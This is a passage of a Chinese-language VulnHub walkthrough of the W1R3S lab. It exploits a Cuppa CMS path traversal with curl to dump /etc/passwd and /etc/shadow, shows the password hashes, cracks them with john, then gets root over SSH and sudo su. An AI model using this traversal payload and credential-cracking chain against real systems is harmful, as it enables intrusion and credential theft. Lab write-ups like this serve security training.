<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/03/11/PLhy8UgoW3N9bOj.png" alt="vulnhub-w1r3s-9"></p>
<p>路径没问题，但是无法显示，因此在尝试下一种方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ curl --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.152.132/administrator/alerts/alertConfigField.php </span><br><span class="line">&lt;style&gt;</span><br><span class="line">    .new_content&#123;</span><br><span class="line">        position: fixed;</span><br><span class="line">    &#125;</span><br><span class="line">    .alert_config_field&#123;</span><br><span class="line">        font-size:12px;</span><br><span class="line">        background:#FFF;</span><br><span class="line">        position:relative;</span><br><span class="line">        border-radius: 3px;</span><br><span class="line">        box-shadow: 0px 0px 5px rgba(0,0,0,0.2);</span><br><span class="line">        overflow:hidden;</span><br><span class="line">        position:fixed;</span><br><span class="line">        top:50%;</span><br><span class="line">        left:50%;</span><br><span class="line">        width:600px;</span><br><span class="line">        height:440px;</span><br><span class="line">        margin-left:-300px;</span><br><span class="line">        margin-top:-220px;</span><br><span class="line">    &#125;</span><br><span class="line">    .alert_config_top&#123;</span><br><span class="line">        position: relative;</span><br><span class="line">        margin: 2px;</span><br><span class="line">        margin-bottom: 0px;</span><br><span class="line">        border: 1px solid #D2D2D2;</span><br><span class="line">        background: #4489F8;</span><br><span class="line">        overflow: auto;</span><br><span class="line">        color:#FFF;</span><br><span class="line">        font-size: 13px;</span><br><span class="line">        padding: 7px 5px;</span><br><span class="line">        box-shadow: 0 0 2px rgba(0, 0, 0, 0.1);</span><br><span class="line">        text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);</span><br><span class="line">    &#125;</span><br><span class="line">    .description_alert&#123;</span><br><span class="line">        position:relative;</span><br><span class="line">        font-size:12px;</span><br><span class="line">        text-shadow:0 1px #FFFFFF;</span><br><span class="line">        font-weight: normal;</span><br><span class="line">        padding: 5px 0px 5px 0px;</span><br><span class="line">    &#125;</span><br><span class="line">    .btnClose_alert&#123;</span><br><span class="line">        position:absolute;</span><br><span class="line">        top: 4px; right: 2px;</span><br><span class="line">        width:22px;</span><br><span class="line">        height:22px;</span><br><span class="line">        cursor:pointer;</span><br><span class="line">        background:url(js/cuppa/cuppa_images/close_white.png) no-repeat;</span><br><span class="line">        background-position: center;</span><br><span class="line">        background-size: 13px;</span><br><span class="line">    &#125;</span><br><span class="line">    .content_alert_config&#123;</span><br><span class="line">        position:relative;</span><br><span class="line">        clear:both;</span><br><span class="line">        margin: 2px;</span><br><span class="line">        margin-top: 0px;</span><br><span class="line">        height: 401px;</span><br><span class="line">        padding: 10px;</span><br><span class="line">        overflow: auto;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">        function CloseDefaultAlert()&#123;</span><br><span class="line">                cuppa.setContent(&#123;&#x27;load&#x27;:false, duration:0.2&#125;);</span><br><span class="line">        cuppa.blockade(&#123;&#x27;load&#x27;:false, duration:0.2, delay:0.1&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;div class=&quot;alert_config_field&quot; id=&quot;alert&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;alert_config_top&quot;&gt;</span><br><span class="line">        &lt;strong&gt;Configuration&lt;/strong&gt;:         &lt;div class=&quot;btnClose_alert&quot; id=&quot;btnClose_alert&quot; onclick=&quot;CloseDefaultAlert()&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div id=&quot;content_alert_config&quot; class=&quot;content_alert_config&quot;&gt;</span><br><span class="line">        root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false</span><br><span class="line">syslog:x:104:108::/home/syslog:/bin/false</span><br><span class="line">_apt:x:105:65534::/nonexistent:/bin/false</span><br><span class="line">messagebus:x:106:110::/var/run/dbus:/bin/false</span><br><span class="line">uuidd:x:107:111::/run/uuidd:/bin/false</span><br><span class="line">lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false</span><br><span class="line">whoopsie:x:109:117::/nonexistent:/bin/false</span><br><span class="line">avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false</span><br><span class="line">avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false</span><br><span class="line">dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false</span><br><span class="line">colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false</span><br><span class="line">speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false</span><br><span class="line">hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false</span><br><span class="line">kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false</span><br><span class="line">pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false</span><br><span class="line">rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false</span><br><span class="line">saned:x:119:127::/var/lib/saned:/bin/false</span><br><span class="line">usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false</span><br><span class="line">w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash</span><br><span class="line">sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">ftp:x:122:129:ftp daemon,,,:/srv/ftp:/bin/false</span><br><span class="line">mysql:x:123:130:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;        </span><br></pre></td></tr></table></figure>
<p>关于这个payload，就是使用curl方法读取alertConfigField.php，参数为urlConfig=…/…/…/…/…/…/…/…/…/etc/passwd，请求需要使用url编码，但是这一步仍有疑惑。</p>
<p>同样在这一步存在密码hash的地方都是用x代替的，再去读取shadow中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ curl --data-urlencode urlConfig=../../../../../../../../../etc/shadow http://192.168.152.132/administrator/alerts/alertConfigField.php</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    .new_content&#123;</span><br><span class="line">        position: fixed;</span><br><span class="line">    &#125;</span><br><span class="line">    .alert_config_field&#123;</span><br><span class="line">        font-size:12px;</span><br><span class="line">        background:#FFF;</span><br><span class="line">        position:relative;</span><br><span class="line">        border-radius: 3px;</span><br><span class="line">        box-shadow: 0px 0px 5px rgba(0,0,0,0.2);</span><br><span class="line">        overflow:hidden;</span><br><span class="line">        position:fixed;</span><br><span class="line">        top:50%;</span><br><span class="line">        left:50%;</span><br><span class="line">        width:600px;</span><br><span class="line">        height:440px;</span><br><span class="line">        margin-left:-300px;</span><br><span class="line">        margin-top:-220px;</span><br><span class="line">    &#125;</span><br><span class="line">    .alert_config_top&#123;</span><br><span class="line">        position: relative;</span><br><span class="line">        margin: 2px;</span><br><span class="line">        margin-bottom: 0px;</span><br><span class="line">        border: 1px solid #D2D2D2;</span><br><span class="line">        background: #4489F8;</span><br><span class="line">        overflow: auto;</span><br><span class="line">        color:#FFF;</span><br><span class="line">        font-size: 13px;</span><br><span class="line">        padding: 7px 5px;</span><br><span class="line">        box-shadow: 0 0 2px rgba(0, 0, 0, 0.1);</span><br><span class="line">        text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);</span><br><span class="line">    &#125;</span><br><span class="line">    .description_alert&#123;</span><br><span class="line">        position:relative;</span><br><span class="line">        font-size:12px;</span><br><span class="line">        text-shadow:0 1px #FFFFFF;</span><br><span class="line">        font-weight: normal;</span><br><span class="line">        padding: 5px 0px 5px 0px;</span><br><span class="line">    &#125;</span><br><span class="line">    .btnClose_alert&#123;</span><br><span class="line">        position:absolute;</span><br><span class="line">        top: 4px; right: 2px;</span><br><span class="line">        width:22px;</span><br><span class="line">        height:22px;</span><br><span class="line">        cursor:pointer;</span><br><span class="line">        background:url(js/cuppa/cuppa_images/close_white.png) no-repeat;</span><br><span class="line">        background-position: center;</span><br><span class="line">        background-size: 13px;</span><br><span class="line">    &#125;</span><br><span class="line">    .content_alert_config&#123;</span><br><span class="line">        position:relative;</span><br><span class="line">        clear:both;</span><br><span class="line">        margin: 2px;</span><br><span class="line">        margin-top: 0px;</span><br><span class="line">        height: 401px;</span><br><span class="line">        padding: 10px;</span><br><span class="line">        overflow: auto;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">        function CloseDefaultAlert()&#123;</span><br><span class="line">                cuppa.setContent(&#123;&#x27;load&#x27;:false, duration:0.2&#125;);</span><br><span class="line">        cuppa.blockade(&#123;&#x27;load&#x27;:false, duration:0.2, delay:0.1&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;div class=&quot;alert_config_field&quot; id=&quot;alert&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;alert_config_top&quot;&gt;</span><br><span class="line">        &lt;strong&gt;Configuration&lt;/strong&gt;:         &lt;div class=&quot;btnClose_alert&quot; id=&quot;btnClose_alert&quot; onclick=&quot;CloseDefaultAlert()&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div id=&quot;content_alert_config&quot; class=&quot;content_alert_config&quot;&gt;</span><br><span class="line">        root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::</span><br><span class="line">daemon:*:17379:0:99999:7:::</span><br><span class="line">bin:*:17379:0:99999:7:::</span><br><span class="line">sys:*:17379:0:99999:7:::</span><br><span class="line">sync:*:17379:0:99999:7:::</span><br><span class="line">games:*:17379:0:99999:7:::</span><br><span class="line">man:*:17379:0:99999:7:::</span><br><span class="line">lp:*:17379:0:99999:7:::</span><br><span class="line">mail:*:17379:0:99999:7:::</span><br><span class="line">news:*:17379:0:99999:7:::</span><br><span class="line">uucp:*:17379:0:99999:7:::</span><br><span class="line">proxy:*:17379:0:99999:7:::</span><br><span class="line">www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::</span><br><span class="line">backup:*:17379:0:99999:7:::</span><br><span class="line">list:*:17379:0:99999:7:::</span><br><span class="line">irc:*:17379:0:99999:7:::</span><br><span class="line">gnats:*:17379:0:99999:7:::</span><br><span class="line">nobody:*:17379:0:99999:7:::</span><br><span class="line">systemd-timesync:*:17379:0:99999:7:::</span><br><span class="line">systemd-network:*:17379:0:99999:7:::</span><br><span class="line">systemd-resolve:*:17379:0:99999:7:::</span><br><span class="line">systemd-bus-proxy:*:17379:0:99999:7:::</span><br><span class="line">syslog:*:17379:0:99999:7:::</span><br><span class="line">_apt:*:17379:0:99999:7:::</span><br><span class="line">messagebus:*:17379:0:99999:7:::</span><br><span class="line">uuidd:*:17379:0:99999:7:::</span><br><span class="line">lightdm:*:17379:0:99999:7:::</span><br><span class="line">whoopsie:*:17379:0:99999:7:::</span><br><span class="line">avahi-autoipd:*:17379:0:99999:7:::</span><br><span class="line">avahi:*:17379:0:99999:7:::</span><br><span class="line">dnsmasq:*:17379:0:99999:7:::</span><br><span class="line">colord:*:17379:0:99999:7:::</span><br><span class="line">speech-dispatcher:!:17379:0:99999:7:::</span><br><span class="line">hplip:*:17379:0:99999:7:::</span><br><span class="line">kernoops:*:17379:0:99999:7:::</span><br><span class="line">pulse:*:17379:0:99999:7:::</span><br><span class="line">rtkit:*:17379:0:99999:7:::</span><br><span class="line">saned:*:17379:0:99999:7:::</span><br><span class="line">usbmux:*:17379:0:99999:7:::</span><br><span class="line">w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::</span><br><span class="line">sshd:*:17554:0:99999:7:::</span><br><span class="line">ftp:*:17554:0:99999:7:::</span><br><span class="line">mysql:!:17554:0:99999:7:::</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;      </span><br></pre></td></tr></table></figure>
<h4 id="密码破解">密码破解</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::</span><br><span class="line">www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::</span><br><span class="line">w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::</span><br></pre></td></tr></table></figure>
<p>可能是密码简单，破解起来也很顺利，但是没有root用户的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ john hash</span><br><span class="line">Warning: detected hash type &quot;sha512crypt&quot;, but the string is also recognized as &quot;HMAC-SHA256&quot;</span><br><span class="line">Use the &quot;--format=HMAC-SHA256&quot; option to force loading these as that type instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])</span><br><span class="line">Cost 1 (iteration count) is 5000 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">www-data         (www-data)     </span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst</span><br><span class="line">computer         (w1r3s)    </span><br></pre></td></tr></table></figure>
<p>但是也算找到了立足点，先登录一下w1r3s</p>
<p>成功登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ssh w1r3s@192.168.152.132  </span><br><span class="line">The authenticity of host &#x27;192.168.152.132 (192.168.152.132)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:Bue5VbUKeMSJMQdicmcMPTCv6xvD7I+20Ki8Um8gcWM.</span><br><span class="line">This key is not known by any other names.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;192.168.152.132&#x27; (ED25519) to the list of known hosts.</span><br><span class="line">----------------------</span><br><span class="line">Think this is the way?</span><br><span class="line">----------------------</span><br><span class="line">Well,........possibly.</span><br><span class="line">----------------------</span><br><span class="line">w1r3s@192.168.152.132&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">108 packages can be updated.</span><br><span class="line">6 updates are security updates.</span><br><span class="line"></span><br><span class="line">.....You made it huh?....</span><br><span class="line">Last login: Mon Jan 22 22:47:27 2018 from 192.168.0.35</span><br><span class="line">w1r3s@W1R3S:~$ </span><br></pre></td></tr></table></figure>
<h2 id="提权">提权</h2>
<p>已经给出了明显的提示，作为一个靶场，很确定的就是通过该账户去进行提权操作，当然有兴趣也可以去看看wordpress是否还有什么内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">----------------------</span><br><span class="line">Think this is the way?</span><br><span class="line">----------------------</span><br><span class="line">Well,........possibly.</span><br><span class="line">----------------------</span><br></pre></td></tr></table></figure>
<p>进行一个枚举操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">w1r3s@W1R3S:~$ whoami</span><br><span class="line">w1r3s</span><br><span class="line">w1r3s@W1R3S:~$ ls</span><br><span class="line">Desktop  Documents  Downloads  examples.desktop  ftp  Music  Pictures  Public  Templates  Videos</span><br><span class="line">w1r3s@W1R3S:~$ id</span><br><span class="line">uid=1000(w1r3s) gid=1000(w1r3s) groups=1000(w1r3s),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)</span><br></pre></td></tr></table></figure>
<p>有sudo的权限想提权就简单了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">w1r3s@W1R3S:~$ sudo -l</span><br><span class="line">[sudo] password for w1r3s: </span><br><span class="line">Matching Defaults entries for w1r3s on W1R3S.localdomain:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User w1r3s may run the following commands on W1R3S.localdomain:</span><br><span class="line">    (ALL : ALL) ALL</span><br></pre></td></tr></table></figure>
<p>显示有all，直接sudo su</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">w1r3s@W1R3S:~$ sudo su</span><br><span class="line">root@W1R3S:/# whoami</span><br><span class="line">root</span><br><span class="line">root@W1R3S:/# whoami</span><br><span class="line">root</span><br><span class="line">root@W1R3S:/# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@W1R3S:/# uname -a</span><br><span class="line">Linux W1R3S 4.13.0-36-generic #40~16.04.1-Ubuntu SMP Fri Feb 16 23:25:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line">root@W1R3S:/# ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:60:2f:0a brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.152.132/24 brd 192.168.152.255 scope global dynamic ens33</span><br><span class="line">       valid_lft 1548sec preferred_lft 1548sec</span><br><span class="line">    inet6 fe80::4564:7ee7:b335:26ec/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>
<p>提权成功</p>
<p>拿到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@W1R3S:/# cd root</span><br><span class="line">root@W1R3S:~# ls</span><br><span class="line">flag.txt</span><br><span class="line">root@W1R3S:~# cat flag.txt </span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line">   ____ ___  _   _  ____ ____      _  _____ _   _ _        _  _____ ___ ___  _   _ ____  </span><br><span class="line">  / ___/ _ \| \ | |/ ___|  _ \    / \|_   _| | | | |      / \|_   _|_ _/ _ \| \ | / ___| </span><br><span class="line"> | |  | | | |  \| | |  _| |_) |  / _ \ | | | | | | |     / _ \ | |  | | | | |  \| \___ \ </span><br><span class="line"> | |__| |_| | |\  | |_| |  _ &lt;  / ___ \| | | |_| | |___ / ___ \| |  | | |_| | |\  |___) |</span><br><span class="line">  \____\___/|_| \_|\____|_| \_\/_/   \_\_|  \___/|_____/_/   \_\_| |___\___/|_| \_|____/ </span><br><span class="line">                                                                                        </span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">                          .-----------------TTTT_-----_______</span><br><span class="line">                        /&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;(______O] ----------____  \______/]_</span><br><span class="line">     __...---&#x27;&quot;&quot;&quot;\_ --&#x27;&#x27;   Q                               ___________@</span><br><span class="line"> |&#x27;&#x27;&#x27;                   ._   _______________=---------&quot;&quot;&quot;&quot;&quot;&quot;&quot;</span><br><span class="line"> |                ..--&#x27;&#x27;|   l L |_l   |</span><br><span class="line"> |          ..--&#x27;&#x27;      .  /-___j &#x27;   &#x27;</span><br><span class="line"> |    ..--&#x27;&#x27;           /  ,       &#x27;   &#x27;</span><br><span class="line"> |--&#x27;&#x27;                /           `    \</span><br><span class="line">                      L__&#x27;         \    -</span><br><span class="line">                                    -    &#x27;-.</span><br><span class="line">                                     &#x27;.    /</span><br><span class="line">                                       &#x27;-./</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------</span><br><span class="line">  YOU HAVE COMPLETED THE</span><br><span class="line">               __      __  ______________________   _________</span><br><span class="line">              /  \    /  \/_   \______   \_____  \ /   _____/</span><br><span class="line">              \   \/\/   / |   ||       _/ _(__  &lt; \_____  \ </span><br><span class="line">               \        /  |   ||    |   \/       \/        \</span><br><span class="line">                \__/\  /   |___||____|_  /______  /_______  /.INC</span><br><span class="line">                     \/                \/       \/        \/        CHALLENGE, V 1.0</span><br><span class="line">----------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">CREATED BY SpecterWires</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
<h2 id="补充">补充</h2>
<p>还有一种简便但不推荐的方式，直接使用hashcat或者hydra进行ssh的爆破，最终也是能拿到相同的密码的</p>
]]></content>
      <categories>
        <category>VulnHub</category>
      </categories>
      <tags>
        <tag>VulnHub</tag>
      </tags>
  </entry>
</search>
